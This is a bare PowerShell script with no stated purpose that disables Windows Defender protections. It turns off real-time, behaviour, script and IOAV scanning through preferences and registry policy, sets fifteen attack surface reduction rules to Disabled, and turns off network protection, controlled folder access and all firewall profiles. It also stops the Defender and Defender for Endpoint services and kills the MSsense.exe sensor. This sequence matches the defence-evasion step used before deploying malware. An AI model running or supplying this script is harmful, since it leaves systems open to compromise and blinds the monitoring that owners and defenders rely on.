Set-MpPreference -DisableBlockAtFirstSeen $True

New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableBlockAtFirstSeen" -Value 1 -PropertyType "DWord"

Set-MpPreference -DisableIOAVProtection $True

New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableIOAVProtection" -Value 1 -PropertyType "DWord"

Set-MpPreference -DisableBehaviorMonitoring $True

New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType "DWord"

Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A, 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC, 92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B, 3B576869-A4EC-4529-8536-B80A7769E899, 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84, D3E037E1-3EB8-44C8-A917-57927947596D, BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550, 01443614-cd74-433a-b99e-2ecdc07bfc25, c1db55ab-c21a-4637-bb3f-a12568109d35, 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2, d1e49aac-8f56-4280-b9ba-993a6d77406c, b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4, 26190899-1602-49e8-8b27-eb1d0a1ce869, 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c, e6db77e5-3df2-4cf1-b95a-636979351e5b -AttackSurfaceReductionRules_Actions Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled

Set-MpPreference -EnableNetworkProtection 0

Set-MpPreference -EnableControlledFolderAccess 0

Set-NetFirewallProfile -All -Enabled False

Set-MpPreference -DisableScriptScanning $True

New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableScriptScanning" -Value 1 -PropertyType "DWord"

Set-MpPreference -DisableRealtimeMonitoring $True

New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType "DWord"

Stop-Service -Name WinDefend -Force -PassThru -ErrorAction Ignore

Stop-Service -Name WdNisSvc -Force -PassThru -ErrorAction Ignore

Stop-Service -Name Sense -Force -PassThru -ErrorAction Ignore

Taskkill /s system /f /IM MSsense.exe
